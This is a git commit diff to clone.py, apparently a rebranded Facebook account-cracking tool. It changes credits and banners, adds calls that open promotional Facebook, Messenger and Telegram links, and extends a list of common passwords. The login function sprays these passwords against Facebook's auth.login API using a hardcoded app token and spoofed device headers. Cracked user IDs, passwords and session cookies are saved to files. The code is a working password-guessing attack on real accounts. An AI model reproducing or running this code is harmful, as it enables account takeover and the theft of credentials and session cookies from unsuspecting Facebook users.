31c6655266993a2a747e0ad27e6a9ea27400e1de
varundhawal11 <163484199+varundhawal11@users.noreply.github.com>
2024-10-09 05:33:04 +0530

    Update clone.py
    git clone https://github.com/varundhawal11/CLONING1.git
    cd CLONING1 
    python clone.py

--- clone.py
+++ clone.py
@@ -1,8 +1,3 @@
-'''
-   DEVOLOPER MR - ASRAFUL
---- FYLL UPDATED
---- GIVE CREDIT ASRAFUL TERMUX COMMUNITY 
-'''
 import os,sys,uuid,re,random,time,string,json
 
 try:
@@ -16,7 +11,7 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 version="v5"
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';W = '\x1b[38;5;196m';hh = '\033[34;1m'
+
 class sort:
     def line():
         return "[b dark_sea_green2]━"*37
@@ -25,10 +20,7 @@ class sort:
         os.system("clear")
     
     def logo():
-        aci=f'''
-	[white]┏┓┏┓┳┓┏┓┏┓┳┳┓ 
-	[white]┣┫┗┓┣┫┣┫┣ ┃┃┃ 
-	[white]┛┗┗┛┛┗┛┗┻ ┗┛┗┛\n[red1]{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]ASRAFUL\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Always Free[/r]\n[red1]{sort.line()}'''
+        aci=f'''[b]\n         [deep_pink2] ____  [navy_blue] _  _ [chartreuse1]  ___      \n         [deep_pink2](  [u white]_[/u white] \ [navy_blue]( \/ ) [chartreuse1]/ __)\n         [deep_pink2] )___/ [navy_blue] \  / [chartreuse1]( (__ \n         [deep_pink2](__)   [navy_blue] (__) [chartreuse1] \___)  [cyan]{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]Heron Afridi\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Always Free[/r]\n{sort.line()}'''
         print(aci)
     
     def color():
@@ -39,10 +31,15 @@ class sort:
 
 def info():
     sort.clear()
-    print('     [b]    [red1] WELCOME TO ASRAFUL TOOL          ')
+    print('     [b]    [red1] WELCOME TO PYC TOOL          ')
     time.sleep(4)
     sort.clear()
-    
+    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
+    os.system("xdg-open https://www.facebook.com/HeronAfridi.Official");time.sleep(2)
+    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
+    os.system("xdg-open https://m.me/j/AbYhZTf4PCEUXDNP/");time.sleep(2)
+    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN CHANNEL ... ")
+    os.system("xdg-open https://t.me/TeamElite_Channel");time.sleep(2)
 #---------# Global
 oks=[]
 loop=0
@@ -64,15 +61,15 @@ def ua():
     xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
     return xx
 
-def samsung():
-    anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
+def Samsung():
+    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
     model=random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
     vir=str(random.choice(range(111111111,999999999)))
     cho=str(random.choice(range(43,447)))
     fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
     FBAN=fb.split("|")[1]
     platform=fb.split("|")[0]
-    ua=f"Dalvik/2.1.0 (Linux; U; Android "+anderson+"; "+model+" Build/LRX22C) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.15.89;FBPN/"+platform+";FBLC/sv_SE;FBBV/"+vir+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};FB_FW/1;]"
+    ua=f"Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/LRX22C) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.15.89;FBPN/"+platform+";FBLC/sv_SE;FBBV/"+vir+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};FB_FW/1;]"
     return ua
 
 
@@ -283,14 +280,14 @@ def file_sub(uid,pwx,name,meth,file):
             if "session_key" in po:
                 oks.append(uid)
                 coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/ASRAFUL_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                print(f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/pyc_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 break
             elif "Please Confirm Email" in str(po):
                 oks.append(uid)
                 coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/ASRAFUL_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                print(f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/pyc_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 break
             else:continue 
         loop+=1
@@ -407,15 +404,15 @@ def ren_sub(uid,pwx,meth,user):
                 uid=po["uid"]
                 oks.append(uid)
                 coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/ASRAFUL_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                print(f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/pyc_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 break
             elif "Please Confirm Email" in str(po):
                 oks.append(uid)
                 uid=po["uid"]
                 coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f"\r\r[reverse white][ASRAFUL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/ASRAFUL_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                print(f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/pyc_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 break
             else:continue
         loop+=1
@@ -460,32 +457,37 @@ def login(uid,meth):
     global oks,loop
     Session=requests.session()
     try:
-        sys.stdout.write(f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}ASRAFUL-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
+        sys.stdout.write(f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
         sys.stdout.flush()
-        for pw in ["123456","1234567","12345678","123456789"]:
+        for pw in ["123456","1234567","12345678","123456789","1234567","12345678","123456789","123123", "@#@#@#"," @@@###","@@@@@@","102030","usausa","facebook","password"]:
             if meth in ["1","01","A","a"]:
                 agent=ua()
             else:
-                agent=samsung()
+                agent=Samsung()
             headers = {
             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
             "x-fb-sim-hni": str(random.randint(20000, 40000)), 
             "x-fb-net-hni": str(random.randint(20000, 40000)), 
             "x-fb-connection-quality": "EXCELLENT",
             "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-            "user-agent": agent, 
+            "user-agent": 'Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.5; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.83 Safari/534.6 TouchPad/1.0', 
             "content-type": "application/x-www-form-urlencoded", 
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
                 oks.append(uid)
-                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
-                open("/sdcard/ASRAFUL_old.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_red]LOCK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
+                open("/sdcard/pyc_old.txt","a").write(uid+"|"+pw+"\n")
                 break 
             elif "Please Confirm Email" in str(rp):
                 oks.append(uid)
-                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
-                open("/sdcard/ASRAFUL_old.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]CONFIRM YOUR EMAIL[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
+                open("/sdcard/pyc_old.txt","a").write(uid+"|"+pw+"\n")
+                break
+            elif 'www.facebook.com' in rp['error']['message']:
+                oks.append(uid)
+                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]CP[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
+                open("/sdcard/pyc_old.txt","a").write(uid+"|"+pw+"\n")
                 break
             
             else:continue
